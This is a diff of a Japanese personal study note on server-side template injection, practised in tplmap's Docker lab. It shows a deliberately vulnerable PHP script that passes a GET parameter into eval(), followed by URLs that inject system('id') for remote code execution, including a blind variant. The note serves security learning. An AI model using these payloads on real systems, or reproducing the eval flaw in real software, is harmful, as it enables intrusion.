@@ -18,6 +18,7 @@
 ## tplmal (SSTI practice)
 https://github.com/epinna/tplmap   
 SSTI検知ツールで、各テンプレートエンジンの脆弱な環境もDockerで用意されている。   
+### setup
 git cloneして、`docker-envs`ディレクトリ下で`docker-compose up -d`でコンテナを全部作成・起動する。   
 ```txt
 docker@default:~$ docker ps
@@ -31,6 +32,59 @@ f1a58c98075d        docker-envs_tplmap_test_python3   "/bin/sh -c 'python3…"  
 docker@default:~$
 ```
 `http://192.168.99.100:15004/ejs?inj=a`とかでアクセスできる！   
+### php
+#### eval
+`http://192.168.99.100:15002/eval.php?inj=*`   
+![image](https://user-images.githubusercontent.com/56021519/102749953-453b1a00-43a8-11eb-903a-ebbf4ce70376.png)   
+evalに`?inj=`の値がそのまま代入されている。   
+```php
+<?php
+
+function generateRandomString($length = 10) {
+    return substr(str_shuffle(str_repeat($x='0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ', ceil($length/strlen($x)) )),1,$length);
+}
+
+$inj=$_GET["inj"];
+if(isset($_GET["tpl"])) {
+  // Keep the formatting a-la-python
+  $tpl=str_replace("%s", $inj, $_GET["tpl"]);
+}
+else {
+  $tpl=$inj;
+}
+
+if(!$_GET["blind"]) {
+  echo generateRandomString();
+  error_log('DEBUG< : ' . $tpl);
+  $rendered = eval($tpl);
+  error_log('DEBUG> : ' . $rendered);
+  echo generateRandomString();
+}
+else {
+  error_log('DEBUG< : ' . $tpl);
+  ob_start();
+  $rendered = eval($tpl);
+  ob_end_clean();
+  error_log('DEBUG> : ' . $rendered);
+  echo generateRandomString();
+}
+?>
+```
+`http://192.168.99.100:15002/eval.php?inj=system(%27id%27);`でRCE！   
+![image](https://user-images.githubusercontent.com/56021519/102750083-8e8b6980-43a8-11eb-843f-b4732c36e9f3.png)   
+`tpl`の`%s`を`inj`パラメータの値に置き換えるので以下でRCE！   
+`http://192.168.99.100:15002/eval.php?tpl=%25s&inj=system(%27id%27);`   
+blindにすると`id`コマンドの実行結果は見えないが、確かに実行はされている！   
+`http://192.168.99.100:15002/eval.php?tpl=%25s&inj=system(%27id%27);&blind=1`   
+![image](https://user-images.githubusercontent.com/56021519/102750650-87b12680-43a9-11eb-8a7f-b37c06c988c8.png)   
+`http://192.168.99.100:15002/eval.php?tpl=%25s&inj=aaa&blind=1`のようにevalの中でエラーが発生するようにすると、   
+![image](https://user-images.githubusercontent.com/56021519/102750727-aadbd600-43a9-11eb-8e51-3fccd25f2ab6.png)   
+
+### Java
+### python
+### Ruby
+### Node.js
+
 # メモ
 escapeHTMLってどんな感じでエスケープする？   
 動的な文字列連結は脆弱になりがちっぽい   
